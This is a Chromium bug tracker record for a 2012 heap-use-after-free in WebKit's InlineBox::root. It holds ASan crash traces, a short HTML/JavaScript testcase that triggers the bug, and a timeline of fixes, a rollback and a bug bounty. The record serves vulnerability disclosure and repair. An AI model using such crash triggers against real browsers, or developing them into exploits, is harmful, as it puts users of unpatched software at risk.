# Heap-use-after-free in WebCore::InlineBox::root

| Field | Value |
|-------|-------|
| **Issue ID** | [40053631](https://issues.chromium.org/issues/40053631) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-02-12 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

==6447== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffecca2098 at pc 0x55555abe0b85 bp 0x7fffffff21e0 sp 0x7fffffff21d8  

READ of size 8 at 0x7fffecca2098 thread T0  

#0 0x55555abe0b85 in WebCore::InlineBox::root() ???:0  

#1 0x55555aea1bc8 in WebCore::RenderText::setSelectionState(WebCore::RenderObject::SelectionState) ???:0

**VERSION**  

Chrome Version: stable, beta + dev

Chromium 19.0.1040.0 (Developer Build 121661)  

OS Linux  

WebKit 535.21 (@107445)

Operating System: linux 64bit

**REPRODUCTION CASE**

<html>
<head>
<style>
#el1:first-letter {
display: block;
}
</style>
<script>
onload = function(){
el0=document.createElement('div')
document.body.appendChild(el0)
el1=document.createElement('div')
el1.setAttribute('id', 'el1')
el1.appendChild(document.createTextNode('AAA'))
el1.style.display='inline-block'
el0.appendChild(el1)
el0.appendChild(document.createTextNode('A'))
document.execCommand('selectall')
setTimeout(function(){
document.styleSheets[0].insertRule("#el1 { text-transform: capitalize }")
},0)
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==6447== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffecca2098 at pc 0x55555abe0b85 bp 0x7fffffff21e0 sp 0x7fffffff21d8  

READ of size 8 at 0x7fffecca2098 thread T0  

#0 0x55555abe0b85 in WebCore::InlineBox::root() ???:0  

#1 0x55555aea1bc8 in WebCore::RenderText::setSelectionState(WebCore::RenderObject::SelectionState) ???:0

0x7fffecca2098 is located 24 bytes inside of 152-byte region [0x7fffecca2080,0x7fffecca2118)  

freed by thread T0 here:  

#0 0x55555da8f322 in free ??:0  

#1 0x55555adde6b5 in WebCore::RenderLineBoxList::deleteLineBoxes(WebCore::RenderArena\*) ???:0  

#2 0x55555aca583d in WebCore::RenderBlock::layoutInlineChildren(bool, int&, int&) ???:0  

#3 0x55555ac22f95 in WebCore::RenderBlock::layoutBlock(bool, int, WebCore::RenderBlock::BlockLayoutPass) ???:0

## Attachments

- [asan-24152.txt](attachments/asan-24152.txt) (text/x-c; charset=us-ascii, 10.4 KB)
- [stable-asan-24152.txt](attachments/stable-asan-24152.txt) (text/plain; charset=us-ascii, 10.4 KB)
- [24152.html](attachments/24152.html) (text/html; charset=us-ascii, 710 B)
- [beta-asan-24152.txt](attachments/beta-asan-24152.txt) (text/x-c; charset=us-ascii, 9.9 KB)

## Timeline

### in...@chromium.org (2012-02-13)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-22)

This was incorrectly duped out. this is not multi-column specific. Uploading repro to clusterfuzz.

### in...@chromium.org (2012-02-22)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=22107916

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f72081f1e98
Crash State:
  - crash stack -
  WebCore::InlineBox::root
  WebCore::RenderText::setSelectionState
  - free stack -
  WebCore::RenderLineBoxList::deleteLineBoxes
  WebCore::RenderBlock::layoutInlineChildren
  

Minimized Testcase (0.62 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96ovy_LhMr5y4OIjeFYkr3wLz8vqJCzp-D-bCxBl7FdQEa-P8JgzEto8VTkJKp92PV5z-yq2MbtW_e5BMeerNiS1OmEPM5yh_M-rMApwr0B__YMKyaokT-ePVUVXzEv-2LTDkl1i7-r5BcY8U6WXi7yslaweA
<style>
      #el1:first-letter {
        display: block;
</style>
    <script>
      onload = function(){
        el0=document.createElement('div')
        document.body.appendChild(el0)
        el1=document.createElement('div')
        el1.setAttribute('id', 'el1')
        el1.appendChild(document.createTextNode('AAA'))
        el1.style.display='inline-block'
        el0.appendChild(el1) 
        el0.appendChild(document.createTextNode('A'))
        document.execCommand('selectall')
        setTimeout(function(){
          document.styleSheets[0].insertRule("#el1 { text-transform: capitalize }")
        },0)
      }
    </script>

### in...@chromium.org (2012-02-22)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-22)

looking at this.

### in...@chromium.org (2012-02-22)

https://bugs.webkit.org/show_bug.cgi?id=79264

### in...@chromium.org (2012-02-22)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-22)

http://trac.webkit.org/changeset/108547

### in...@chromium.org (2012-02-26)

This caused a regression, need a less aggressive approach. patch rolled out in http://trac.webkit.org/changeset/108933

### in...@chromium.org (2012-03-07)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-08)

Wonderful report as usual :)
$1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-03-08)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-08)

[Empty comment from Monorail migration]

### mi...@gmail.com (2012-03-09)

this isn't fixed yet right? since the fix was rolled back? and since I can repro :D

### ke...@chromium.org (2012-03-09)

Yes, the bug is still open.

### in...@chromium.org (2012-03-09)

http://trac.webkit.org/changeset/110323

### sc...@gmail.com (2012-03-12)

M18: http://trac.webkit.org/changeset/110459

### sc...@gmail.com (2012-03-20)

M17: http://trac.webkit.org/changeset/111423

### sc...@gmail.com (2012-03-21)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-28)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/113902?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053631)*
